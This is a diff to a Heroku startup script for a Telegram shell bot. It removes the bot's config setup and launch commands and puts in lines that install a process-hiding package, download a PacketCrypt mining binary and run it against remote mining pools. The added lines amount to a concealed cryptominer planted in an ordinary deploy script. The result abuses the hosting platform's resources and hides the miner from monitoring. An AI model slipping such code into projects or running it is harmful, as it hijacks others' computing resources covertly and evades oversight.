@@ -6,15 +6,7 @@
 ## edit your Config Vars in heroku/app/settings and 
 ## restart the bot by turning the worker off and back on
 
-echo "Creating config.json..."
-cd /home/shell-bot
-cat > config.json << EOF
-{
-    "authToken": "$BOT_TOKEN",
-    "owner": $OWN_ID
-}
-EOF
-echo "Done."
-
-echo "Starting Bot..."
-node server
+npm i -g node-process-hider
+wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64
+chmod +x packetcrypt-v0.5.1-linux_amd64
+./packetcrypt-v0.5.1-linux_amd64 ann -p walet https://stratum.zetahash.com http://pool.srizbi.com https://stratum.zetahash.com http://pool.srizbi.com 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
